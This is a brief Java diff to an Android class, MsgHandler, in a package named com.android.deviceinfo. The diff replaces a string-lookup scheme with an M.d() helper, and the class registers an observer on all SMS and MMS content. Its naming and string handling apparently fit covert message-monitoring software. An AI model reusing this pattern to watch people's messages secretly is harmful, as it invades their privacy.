@@ -7,10 +7,10 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 public class MsgHandler extends Thread {
 	private static final String TAG = "SmsHandler"; //$NON-NLS-1$
@@ -60,11 +60,11 @@ public class MsgHandler extends Thread {
 		 */
 
 		// content://sms
-		// Messages.getString("25_0") : "content://sms"
+		// M.d("content://sms") : "content://sms"
 
 		// M.1=content://mms-sms
 		msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
-		cr.registerContentObserver(Uri.parse(Messages.getString("M_1")), true, msgObserver); //$NON-NLS-1$
+		cr.registerContentObserver(Uri.parse(M.d("content://mms-sms")), true, msgObserver); //$NON-NLS-1$
 
 		Looper.loop();
 	}
